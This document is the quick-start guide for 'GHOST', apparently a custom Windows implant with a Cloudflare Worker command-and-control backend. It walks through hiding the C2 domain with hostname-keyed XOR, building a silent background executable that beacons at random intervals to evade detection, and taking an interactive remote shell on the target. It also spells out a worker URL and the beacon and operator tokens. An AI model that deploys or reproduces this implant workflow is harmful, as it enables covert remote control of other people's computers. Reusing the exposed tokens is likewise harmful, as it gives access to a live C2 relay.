# GHOST — Quick Start Guide

This guide covers the exact steps to go from a fresh clone to getting an interactive shell on your test machine using the Cloudflare Worker C2 backend you just deployed.

---

## 1. Verify Your Environment

Before compiling the implant, ensure you have the necessary tools:
- **Visual Studio Build Tools 2022** installed (specifically the "Desktop development with C++" workload).
- The Cloudflare Worker is deployed at `https://ghost-c2.sujallamichhane.workers.dev`

You already set up your secure tokens:
- **Beacon Token** (for the implant): `4f8c9b2a7e1d5f3c6a8b9e0d2f4c1a3b5e7d9f8c0b1a2d3e4f5a6b7c8d9e0f1`
- **Operator Token** (for the CLI): `7a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3`

---

## 2. Get Your Target Hostname

The implant uses XOR encryption to hide the C2 domain, and the key is derived from the computer name.
Open PowerShell on the machine where you will run the implant and check the hostname:

```powershell
hostname
# Example output: DESKTOP-LAB
```

---

## 3. Generate the Encrypted Domain Config

Run the python encryption tool. Replace `DESKTOP-LAB` with the actual hostname you got in Step 2.

```powershell
cd C:\Users\lamic\OneDrive\Desktop\ghostimplant
python tools\encrypt_domain.py ghost-c2.sujallamichhane.workers.dev DESKTOP-LAB
```

**Example Output:**
```cpp
// ── Paste this into c2.cpp ──────────────────────────────
const uint8_t C2_DOMAIN_ENCRYPTED[] = {0x14, 0x5D, 0x50, 0x47, ...};
const size_t  C2_DOMAIN_LEN = 36;
```

---

## 4. Configure the Implant

Open `src/c2.cpp` in your editor. Find the config section at the top (around line 14) and update it to look like this:

```cpp
namespace config {
    // 1. Paste the byte array you generated in Step 3
    const uint8_t C2_DOMAIN_ENCRYPTED[] = {0x14, 0x5D, 0x50, /* ... full array ... */};
    const size_t  C2_DOMAIN_LEN = 36;
    const uint16_t C2_PORT = 443;

    // 2. Paste your Beacon Token
    const wchar_t* BEACON_TOKEN = L"4f8c9b2a7e1d5f3c6a8b9e0d2f4c1a3b5e7d9f8c0b1a2d3e4f5a6b7c8d9e0f1";

    // ... rest of the file stays the same
```

---

## 5. Compile the Implant

Open a **Developer PowerShell for VS 2022** (you can search for it in the Start menu). Navigate to the project folder and run the build script:

```powershell
cd C:\Users\lamic\OneDrive\Desktop\ghostimplant

# Build a Debug version (has debug symbols, easier for testing)
.\build.ps1 -Debug

# OR build a Release version (optimized, smaller)
.\build.ps1
```

If successful, it will output `build\ghost.exe`.

---

## 6. Start the Operator CLI

In a standard PowerShell window, set up your operator environment variables and start the CLI:

```powershell
# Set your tokens
$env:GHOST_C2_URL = "https://ghost-c2.sujallamichhane.workers.dev"
$env:GHOST_OPERATOR_TOKEN = "7a3b2c1d0e9f8a7b6c5d4e3f2a1b0c9d8e7f6a5b4c3d2e1f0a9b8c7d6e5f4a3"

# Navigate to the server folder and run the CLI
cd C:\Users\lamic\OneDrive\Desktop\ghostimplant\server
python c2_cli.py sessions
```

It should output `[-] No active sessions.` — this means the CLI is waiting and ready.

---

## 7. Run the Implant

On your target machine, run the compiled executable. Because it is built as a GUI subsystem application, it will run silently in the background with no console window.

```powershell
# Run from the project root
.\build\ghost.exe
```

*Note: The implant sleeps for 45-180 seconds between beacons to evade detection, so it may take up to 3 minutes for it to show up on the server.*

---

## 8. Get a Shell!

Go back to your Operator CLI and list the sessions again. 

```powershell
python c2_cli.py sessions
```

Once you see your session appear in the table, copy the `Session ID` (it will look something like `a1b2c3d4|username`).

Drop into the interactive shell:

```powershell
python c2_cli.py shell <Session_ID>
```

You are now in the interactive shell. Try sending commands:
```
ghost(a1b2c3d4|admin)> whoami
ghost(a1b2c3d4|admin)> ipconfig /all
ghost(a1b2c3d4|admin)> net user
```

The CLI will automatically queue the command on the Cloudflare Worker, wait for the implant's next beacon, and display the output when it arrives!

### Session Management

- Type `bg` in the shell to return to the main CLI menu without killing the implant.
- Type `exit` in the shell (or `python c2_cli.py kill <sid>`) to tell the implant to shut down gracefully and remove the session.
